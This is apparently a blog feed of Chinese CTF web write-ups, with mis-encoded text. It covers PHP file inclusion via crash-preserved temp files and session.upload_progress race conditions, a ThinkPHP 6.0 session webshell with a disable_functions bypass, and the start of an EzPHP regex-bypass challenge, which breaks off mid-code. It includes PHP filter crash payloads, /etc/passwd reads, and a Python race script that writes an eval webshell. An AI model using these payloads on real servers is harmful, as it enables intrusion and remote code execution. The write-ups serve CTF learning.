        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ä¸´æ—¶æ–‡ä»¶åŒ…å«|session|æ¡ä»¶ç«äº‰|segment fault|session.upload_progress]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802163522235.png" alt="image-20210802163522235"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802164104898.png" alt="image-20210802164104898"></p><p>ä¸€çœ‹ç–‘ä¼¼hashé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œè½¬å¤´èŠ±äº†å‡ ä¸ªå°æ—¶å­¦äº†ä¸‹ã€‚</p><p>ç»“æœä¸æ˜¯ï¼Œå¯æƒœäº†ã€‚</p><p>ç›´æ¥?pass=fa25e54758d5d5c1927781a6ede89f8a</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802231716300.png" alt="image-20210802231716300"></p><p>æ–‡ä»¶åŒ…å«</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802231817384.png" alt="image-20210802231817384"></p><p>åŒ…å«../../../../../../flagï¼Œæ²¡æœ‰ç»“æœï¼Œçœ‹æ¥æ²¡é‚£ä¹ˆç®€å•ã€‚</p><p>ä¼ªåè®®è¯»ä¸€ä¸‹æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">           window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"404.html"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>&lt;><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data|input|zip/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'include($_GET["file"])'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯•äº†ä¸‹<code>file[]=php://input</code>è¿œç¨‹æ‰§è¡Œå‘½ä»¤ä¸å¤ªè¡Œã€‚</p><p>æ‰«ç›®å½•æ‰«å‡ºdir.php,æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ä¸´æ—¶æ–‡ä»¶åŒ…å«"><a href="#ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>ä¸´æ—¶æ–‡ä»¶åŒ…å«</h3><blockquote><ol><li>PHPç‰ˆæœ¬&lt;7.2ï¼Œsegment faultç‰¹æ€§ï¼Œå‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼ŒPOSTçš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™</li><li>æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨session.upload_progressè¿›è¡Œsessionæ–‡ä»¶åŒ…å«</li><li>æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨èƒ½è®¿é—®çš„phpinfoé¡µé¢ï¼Œå¯¹å…¶ä¸€æ¬¡å‘é€å¤§é‡æ•°æ®é€ æˆä¸´æ—¶æ–‡ä»¶æ²¡æœ‰åŠæ—¶è¢«åˆ é™¤</li></ol></blockquote><h4 id="åˆ©ç”¨segment-faultç‰¹æ€§"><a href="#åˆ©ç”¨segment-faultç‰¹æ€§" class="headerlink" title="åˆ©ç”¨segment faultç‰¹æ€§"></a>åˆ©ç”¨segment faultç‰¹æ€§</h4><p>phpç‰ˆæœ¬æ˜¯7.0.33ï¼Œè¿™é‡Œé¢„æœŸè§£æ˜¯1å·æƒ…å†µã€‚</p><ul><li><p>php&lt;7.2</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>php7è€ç‰ˆæœ¬é€šæ€</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.quoted-printable-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><pre class="line-numbers language-none"><code class="language-none">import requestsfrom io import BytesIOurl&#x3D;&quot;http:&#x2F;&#x2F;f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;payload&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot;files&#x3D;&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,allow_redirects&#x3D;False)print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“è¿›å»åï¼Œæç¤ºå®ä¾‹æ— æ³•è®¿é—®ï¼Œå› ä¸ºå´©æºƒäº†å˜›</p><p>äº§ç”Ÿä¸´æ—¶æ–‡ä»¶</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802234200446.png" alt="image-20210802234200446"></p><p>ä¹‹åå†æ–‡ä»¶åŒ…å«ä¸‹ï¼Œflagåœ¨phpinfoé‡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802234243611.png" alt="image-20210802234243611"></p><h4 id="æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨session-upload-progress"><a href="#æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨session-upload-progress" class="headerlink" title="æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨session.upload_progress"></a>æ¡ä»¶ç«äº‰ï¼šåˆ©ç”¨session.upload_progress</h4><blockquote><p>åœ¨PHP&gt;5.4ï¼Œ<code>session.upload_progress.enabled</code>è¿™ä¸ªå‚æ•°åœ¨<code>php.ini</code>ä¸­é»˜è®¤å¼€å¯ï¼Œåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆä¸Šä¼ è¿›åº¦æ–‡ä»¶ï¼ŒPHPå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼Œå®ƒçš„å­˜å‚¨è·¯å¾„å¯ä»¥åœ¨<code>phpinfo</code>ä¸­æŸ¥åˆ°</p></blockquote><p>php&gt;5.4,å°è¯•åˆ©ç”¨session.upload_progressè¿›è¡Œsessionæ–‡ä»¶åŒ…å«</p><ul><li><p>å¼€å¯upload_progressåŠŸèƒ½<br>session.upload_progress.enabled = on</p></li><li><p>å½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹<br>session.upload_progress.cleanup = on</p></li></ul><blockquote><p>session.upload_progress.prefix = â€œupload_progress_â€<br>session.upload_progress.name = â€œPHP_SESSION_UPLOAD_PROGRESSâ€</p></blockquote><ul><li><p>session.use_strict_mode=off </p><p>è¡¨ç¤ºå¯¹cookieä¸­çš„sessionidå¯æ§ï¼Œé»˜è®¤offã€‚å³ä½¿æ²¡æœ‰<code>session_start()</code>ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å®šä¹‰PHPSESSIDï¼Œå¹¶ä¸”PHPä¼šè‡ªåŠ¨åˆå§‹åŒ–sessionï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼ç”±<code>session.upload_progress.prefix</code>å’Œ<code>session.upload_progress.name</code>ç»„æˆï¼Œæœ€åè¢«å†™å…¥sessionæ–‡ä»¶é‡Œã€‚æ¯”å¦‚åœ¨Cookieé‡Œè®¾ç½®PHPSESSID=flagï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š<code>/tmp/sess_flag</code></p><blockquote><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œsessionæ–‡ä»¶ä¸€èˆ¬çš„é»˜è®¤å­˜å‚¨ä½ç½®ä¸º/tmpæˆ–/var/lib/php/session</p></blockquote></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> <span class="token string">'http://83b54a25-4b1f-4a71-9d36-be8522dc1261.node4.buuoj.cn/flflflflag.php'</span>sessid <span class="token operator">=</span> <span class="token string">'feng'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            host<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span> <span class="token string">"&lt;?php system('ls /');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?>');echo md5('1');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 1çš„MD5å€¼</span>        <span class="token keyword">if</span> <span class="token string">'c4ca4238a0b923820dcc509a6f75849b'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># ä¸»çº¿ç¨‹é€€å‡ºæ—¶ï¼Œä¸ç®¡å­çº¿ç¨‹æ˜¯å¦å®Œæˆéƒ½éšä¸»çº¿ç¨‹é€€å‡º</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œä¸€ä¸‹ï¼Œé©¬å°±å†™åˆ°<code>shell.php</code>äº†ã€‚</p><h2 id="ç›¸å…³æ–‡ç« "><a href="#ç›¸å…³æ–‡ç« " class="headerlink" title="ç›¸å…³æ–‡ç« "></a>ç›¸å…³æ–‡ç« </h2><p><a href="https://syunaht.com/p/4200301947.html">åˆ©ç”¨phpinfoä¸æ–‡ä»¶åŒ…å«è¿›è¡Œæ¡ä»¶ç«äº‰</a></p><p><a href="https://www.freebuf.com/news/202819.html">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GYCTF2020]EasyThinking</title>
      <link href="/p/3292983066.html"/>
      <url>/p/3292983066.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[session|thinkphp6.0|disable_function]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802134114753.png" alt="image-20210802134114753"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802134245687.png" alt="image-20210802134245687"></p><p>æ‰«äº†ä¸‹ç›®å½•ï¼Œå‘ç°<a href="http://www.zipæºç æ³„æ¼/">www.zipæºç æ³„æ¼</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802141917354.png" alt="image-20210802141917354"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802142005356.png" alt="image-20210802142005356"></p><p>thinkphp6.0</p><p>searchsploitæœäº†ä¸‹æ²¡å•¥ç»“æœ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802142053259.png" alt="image-20210802142053259"></p><p>è°·æ­Œæœæœï¼Œæœåˆ°ä¸ªæœ‰å…³sessionçš„ã€‚</p><p>æ­£å¥½ä»£ç é‡Œsessionæ˜¯å¯æ§çš„ã€‚</p><blockquote><p>sessionéœ€è¦32ä½é•¿åº¦</p></blockquote><p>äºæ˜¯</p><p>å…ˆæ„é€ session</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802160818951.png" alt="image-20210802160818951"></p><p>æ¯”å¦‚è¿™æ ·ï¼Œéœ€è¦åœ¨ç™»å½•çš„æ—¶å€™å°±æ„é€ ï¼Œå› ä¸ºä¸ç™»å½•ï¼Œé‚£å°±æ²¡åŠæ³•searchã€‚</p><p>ç„¶å</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802160926197.png" alt="image-20210802160926197"></p><p>ä¹‹åè®¿é—®ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">runtime<span class="token operator">/</span>session<span class="token operator">/</span>sess_1111111111111111111111111111<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802161015328.png" alt="image-20210802161015328"></p><p>æˆåŠŸã€‚</p><p>ç„¶åå‘ä¸ªé©¬è¿‡å»ï¼Œè¿èšå‰‘ï¼Œå‘ç°æ²¡æƒé™è¯»ã€‚ä¸‹é¢è¿˜æœ‰ä¸ªreadflagã€‚æ˜æ˜¾ï¼Œæ˜¯è¦æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162239911.png" alt="image-20210802162239911"></p><p>phpinfoçœ‹ä¸€ä¸‹ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œç„¶åå¼€å§‹è€ƒè™‘ç»•è¿‡disable_function</p><h3 id="èšå‰‘"><a href="#èšå‰‘" class="headerlink" title="èšå‰‘"></a>èšå‰‘</h3><p>æå‡ºèšå‰‘å¤§å®è´ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•è¿‡å»ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162324799.png" alt="image-20210802162324799"></p><p>ä¸€é”®bypassï¼èšå‰‘ç‰›é€¼(ç ´éŸ³</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162224999.png" alt="image-20210802162224999"></p><h3 id="æ‰‹åŠ¨"><a href="#æ‰‹åŠ¨" class="headerlink" title="æ‰‹åŠ¨"></a>æ‰‹åŠ¨</h3><p>æ¥ä¸‹æ¥æ‰‹åŠ¨ä¸‹</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162534169.png" alt="image-20210802162534169"></p><p>ç„¶åæŠŠæ–‡ä»¶ä¸Šä¼ </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162731298.png" alt="image-20210802162731298"></p><p>æ–‡ä»¶åŒ…å«ä¸€ä¸‹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162744004.png" alt="image-20210802162744004"></p><p>ç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[BJDCTF2020]EzPHP</title>
      <link href="/p/3645611024.html"/>
      <url>/p/3645611024.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®è¯:[create_function|get_defined_vars|æ­£åˆ™ç»•è¿‡]</p><p>å†™äº†å¿«åŠä¸ªæœˆçš„æœºå™¨äººäº†ï¼Œæ‘¸äº†å¥½ä¹…çš„é±¼ï¼Œä»Šå¤©é‡æ–°å¼€å§‹åšwebï¼</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160534512.png" alt="image-20210801160534512"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160544721.png" alt="image-20210801160544721"></p><p>base64è§£ä¸€ä¸‹ï¼Œä¹±ç </p><p>è¯•è¯•å…¶ä»–çš„</p><p>æœ€åbase32è§£å‡ºæ¥<code>1nD3x.php</code></p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1nD3x.php"</span><span class="token punctuation">;</span><span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span 